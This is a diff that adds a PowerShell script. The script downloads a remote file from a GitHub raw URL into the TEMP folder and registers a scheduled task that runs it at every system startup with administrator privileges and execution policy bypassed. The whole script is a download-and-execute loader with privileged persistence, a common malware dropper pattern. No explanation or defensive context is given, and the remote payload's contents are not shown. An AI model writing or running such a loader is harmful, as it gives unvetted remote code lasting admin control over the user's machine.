@@ -1,0 +1,16 @@
+# Set the GitHub script URL
+$githubScriptUrl = "https://raw.githubusercontent.com/Leefni0/kaas/main/pindakaas"
+
+# Set the destination path for the downloaded script
+$downloadedScriptPath = "$env:TEMP\pindakaas.ps1"
+
+# Download the script from GitHub
+Invoke-WebRequest -Uri $githubScriptUrl -OutFile $downloadedScriptPath
+
+# Set up a scheduled task to run the script on startup with admin privileges
+$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$downloadedScriptPath`""
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -UserId (New-Object Security.Principal.NTAccount -ArgumentList "BUILTIN\Administrators") -LogonType S4U
+Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "RunScriptOnStartup" -Force
+
+Write-Host "Done."
